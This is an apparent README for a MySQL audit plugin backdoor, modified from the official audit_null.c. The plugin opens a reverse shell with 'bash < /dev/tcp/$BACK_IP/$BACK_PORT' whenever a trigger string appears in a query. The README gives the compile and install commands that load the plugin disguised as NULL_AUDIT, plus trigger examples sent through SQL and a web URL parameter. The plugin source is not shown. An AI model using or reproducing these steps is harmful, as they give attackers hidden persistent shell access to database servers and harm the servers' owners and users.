####A tricked mysql audit plugin backdoor

Modified from 'audit_null.c' for official MySQL releases.

by t57root @ openwill.me 

&lt;t57root@gmail.com>  [www.HackShell.net](http://www.hackshell.net/)

This plugin watches the queries on the mysql server and will execute the shell command 'bash < /dev/tcp/$BACK_IP/$BACK_PORT >&0 2>&0 &' when there's specific string in the running query so we can get shell access with a reverse connection.

* Compile:

>>gcc -o audit_null.so audit_null.c \`mysql_config --cflags\` -shared -fPIC -DMYSQL_DYNAMIC_PLUGIN 

* Install:

>>\#cp audit_null.so /usr/lib/mysql/plugin/

>>mysql>install plugin NULL_AUDIT soname 'audit_null.so';

* Usage:

>>mysql>select * from news where id='openwill.me';

>>OR

>>http://www.hackshell.net/news.php?id='openwill.me'

More details available at [This link](http://example.net/)
